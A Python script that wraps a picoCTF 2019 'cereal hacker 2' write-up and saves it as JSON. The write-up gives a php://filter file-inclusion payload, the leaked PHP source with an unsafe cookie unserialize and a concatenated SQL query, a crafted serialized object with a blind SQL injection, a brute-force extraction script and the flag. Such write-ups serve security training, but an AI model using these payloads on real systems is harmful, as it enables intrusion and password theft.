testo = """# cereal hacker 2 - 500pt
### Challenge ###
> Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195
### Hints ###
> No hints
### Solution ###
It is a little bit different and harder than the previous challenge, in fact it is a local file inclusion exploit; The problem was that the server appended `.php` after the name of the file parameter on the url, so you could only use a php wrapper to encode in base64 the content of some php pages; we encoded `admin.php` and `cookie.php` with a php wrapper called `filter`

here is the payload to send in the file parameter decode admin.php

`php://filter/convert.base64-encode/resource=admin`

here is the base64 encoded source code of admin.php
```
PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg==
```

here is the souce code of admin.php
```php
<?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
else{
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
?>

```

 here is the payload to send in the file parameter decode cookie.php
 
`php://filter/convert.base64-encode/resource=cookie`

here is the base64 encoded source code of cookie.php
```
PD9waHAKCnJlcXVpcmVfb25jZSgnLi4vc3FsX2Nvbm5lY3QucGhwJyk7CgovLyBJIGdvdCB0aXJlZCBvZiBteSBwaHAgc2Vzc2lvbnMgZXhwaXJpbmcsIHNvIEkganVzdCBwdXQgYWxsIG15IHVzZWZ1bCBpbmZvcm1hdGlvbiBpbiBhIHNlcmlhbGl6ZWQgY29va2llCmNsYXNzIHBlcm1pc3Npb25zCnsKCXB1YmxpYyAkdXNlcm5hbWU7CglwdWJsaWMgJHBhc3N3b3JkOwoJCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgkdSwgJHApewoJCSR0aGlzLT51c2VybmFtZSA9ICR1OwoJCSR0aGlzLT5wYXNzd29yZCA9ICRwOwoJfQoKCWZ1bmN0aW9uIGlzX2FkbWluKCl7CgkJZ2xvYmFsICRzcWxfY29ubjsKCQlpZigkc3FsX2Nvbm4tPmNvbm5lY3RfZXJybm8pewoJCQlkaWUoJ0NvdWxkIG5vdCBjb25uZWN0Jyk7CgkJfQoJCS8vJHEgPSAnU0VMRUNUIGFkbWluIEZST00gcGljb19jaDIudXNlcnMgV0hFUkUgdXNlcm5hbWUgPSBcJycuJHRoaXMtPnVzZXJuYW1lLidcJyBBTkQgKHBhc3N3b3JkID0gXCcnLiR0aGlzLT5wYXNzd29yZC4nXCcpOyc7CgkJCgkJaWYgKCEoJHByZXBhcmVkID0gJHNxbF9jb25uLT5wcmVwYXJlKCJTRUxFQ1QgYWRtaW4gRlJPTSBwaWNvX2NoMi51c2VycyBXSEVSRSB1c2VybmFtZSA9ID8gQU5EIHBhc3N3b3JkID0gPzsiKSkpIHsKCQkgICAgZGllKCJTUUwgZXJyb3IiKTsKCQl9CgoJCSRwcmVwYXJlZC0+YmluZF9wYXJhbSgnc3MnLCAkdGhpcy0+dXNlcm5hbWUsICR0aGlzLT5wYXNzd29yZCk7CgkKCQlpZiAoISRwcmVwYXJlZC0+ZXhlY3V0ZSgpKSB7CgkJICAgIGRpZSgiU1FMIGVycm9yIik7CgkJfQoJCQoJCWlmICghKCRyZXN1bHQgPSAkcHJlcGFyZWQtPmdldF9yZXN1bHQoKSkpIHsKCQkgICAgZGllKCJTUUwgZXJyb3IiKTsKCQl9CgoJCSRyID0gJHJlc3VsdC0+ZmV0Y2hfYWxsKCk7CgkJaWYoJHJlc3VsdC0+bnVtX3Jvd3MgIT09IDEpewoJCQkkaXNfYWRtaW5fdmFsID0gMDsKCQl9CgkJZWxzZXsKCQkJJGlzX2FkbWluX3ZhbCA9IChpbnQpJHJbMF1bMF07CgkJfQoJCQoJCSRzcWxfY29ubi0+Y2xvc2UoKTsKCQlyZXR1cm4gJGlzX2FkbWluX3ZhbDsKCX0KfQoKLyogbGVnYWN5IGxvZ2luICovCmNsYXNzIHNpdGV1c2VyCnsKCXB1YmxpYyAkdXNlcm5hbWU7CglwdWJsaWMgJHBhc3N3b3JkOwoJCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgkdSwgJHApewoJCSR0aGlzLT51c2VybmFtZSA9ICR1OwoJCSR0aGlzLT5wYXNzd29yZCA9ICRwOwoJfQoKCWZ1bmN0aW9uIGlzX2FkbWluKCl7CgkJZ2xvYmFsICRzcWxfY29ubjsKCQlpZigkc3FsX2Nvbm4tPmNvbm5lY3RfZXJybm8pewoJCQlkaWUoJ0NvdWxkIG5vdCBjb25uZWN0Jyk7CgkJfQoJCSRxID0gJ1NFTEVDVCBhZG1pbiBGUk9NIHBpY29fY2gyLnVzZXJzIFdIRVJFIGFkbWluID0gMSBBTkQgdXNlcm5hbWUgPSBcJycuJHRoaXMtPnVzZXJuYW1lLidcJyBBTkQgKHBhc3N3b3JkID0gXCcnLiR0aGlzLT5wYXNzd29yZC4nXCcpOyc7CgkJCgkJJHJlc3VsdCA9ICRzcWxfY29ubi0+cXVlcnkoJHEpOwoJCWlmKCRyZXN1bHQtPm51bV9yb3dzICE9IDEpewoJCQkkaXNfdXNlcl92YWwgPSAwOwoJCX0KCQllbHNlewoJCQkkaXNfdXNlcl92YWwgPSAxOwoJCX0KCQkKCQkkc3FsX2Nvbm4tPmNsb3NlKCk7CgkJcmV0dXJuICRpc191c2VyX3ZhbDsKCX0KfQoKCmlmKGlzc2V0KCRfQ09PS0lFWyd1c2VyX2luZm8nXSkpewoJdHJ5ewoJCSRwZXJtID0gdW5zZXJpYWxpemUoYmFzZTY0X2RlY29kZSh1cmxkZWNvZGUoJF9DT09LSUVbJ3VzZXJfaW5mbyddKSkpOwoJfQoJY2F0Y2goRXhjZXB0aW9uICRleGNlcHQpewoJCWRpZSgnRGVzZXJpYWxpemF0aW9uIGVycm9yLicpOwoJfQp9Cgo/Pgo=
```

here is the source code of cookie.php

```php
<?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
		    die("SQL error");
		}

		$prepared->bind_param('ss', $this->username, $this->password);
	
		if (!$prepared->execute()) {
		    die("SQL error");
		}
		
		if (!($result = $prepared->get_result())) {
		    die("SQL error");
		}

		$r = $result->fetch_all();
		if($result->num_rows !== 1){
			$is_admin_val = 0;
		}
		else{
			$is_admin_val = (int)$r[0][0];
		}
		
		$sql_conn->close();
		return $is_admin_val;
	}
}

/* legacy login */
class siteuser
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		$result = $sql_conn->query($q);
		if($result->num_rows != 1){
			$is_user_val = 0;
		}
		else{
			$is_user_val = 1;
		}
		
		$sql_conn->close();
		return $is_user_val;
	}
}


if(isset($_COOKIE['user_info'])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
	}
	catch(Exception $except){
		die('Deserialization error.');
	}
}

?>

```
After a brief check on the source code of cookie.php, I found that the legacy object was exploitable with a blind sql injection! the query is `SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = 'this.username' AND password = 'this.password'`,so you could easily login as admin, but to get the flag you had to know the admin's password, so to get it you had to do a blind sql injection

(if you are new to blind sql injection click [here](https://portswigger.net/web-security/sql-injection/blind))

with the string password= `a' or SUBSTRING(password, 1, 60) LIKE 'p%'` you can trigger a true or false response, in fact if the first character of the password is equal to the character you use as input, it will login as admin an print the admin welcome page
![alt tag](https://github.com/davidemaiorca/srdnlen/blob/master/writeups/web/pico19/image/cereal2_1.PNG)
So you just have to try each letter of the alphabet plus the number and some char that can be on the flag, for each letter of the flag, and check if you get the admin page;
To send the request you have to create a cookie called `user_info` and set it with a base64 encoded serialized object, like this:

`O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:41:"a' or SUBSTRING(password, 1, 60) LIKE 'a%";}`

 here is a quick exploit I wrote in python with the [requests](https://pypi.org/project/requests/2.7.0/#description) library to get the flag:

```python
import base64
import requests
default_cookie="O:8:\"siteuser\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:"
default_cookie2=":\"a' or SUBSTRING(password, 1, 60) LIKE '"
default_cookie3="%\";}"

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./{}()[];:"
pas = ""
num = 41
for b in range(60):
	for a in alphabet:
		print(pas+a)
		cookie = default_cookie + str(num) + default_cookie2 + pas + a + default_cookie3
		encoded_cookie = base64.b64encode(cookie.encode("utf-8"))
		final_cookie = {'user_info': str(encoded_cookie)}
		r = requests.post('https://2019shell1.picoctf.com/problem/62195/index.php?file=admin', cookies = final_cookie)
		if 'Welcome' in r.text:
			pas = pas + a
			num = num + 1
			print (pas)
			break
```
after running it it returned the flag
![alt tag](https://github.com/davidemaiorca/srdnlen/blob/master/writeups/web/pico19/image/cereal2_2.PNG)

`picoctf_c9f6ad462c6bb64a53c6e7a6452a6eb7_`

you have to make "ctf" capital and with switch the `_` with `{`, so this is the final **flag**

`picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`

"""
import json

data = { 
    "name":"test writeup",
    "category":"web",
    "content": testo
}

with open('json/writeup.json', 'w') as file:
    json.dump(data, file)

